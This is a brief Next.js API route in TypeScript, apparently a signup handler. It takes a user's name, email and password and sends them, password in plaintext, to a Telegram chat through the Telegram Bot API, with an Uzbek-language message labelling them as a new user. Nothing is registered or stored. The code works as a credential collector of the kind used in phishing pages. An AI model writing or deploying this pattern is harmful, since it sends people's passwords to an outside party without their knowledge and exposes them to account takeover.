
import { NextResponse } from "next/server";

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN!;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID!;

export async function POST(req: Request) {
  const { name, email, password } = await req.json();

  const message = `🆕 Yangi foydalanuvchi:\n👤 Ism: ${name}\n📧 Email: ${email}\n🔐 Parol: ${password}`;

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
    }),
  });

  return NextResponse.json({ success: true });
}
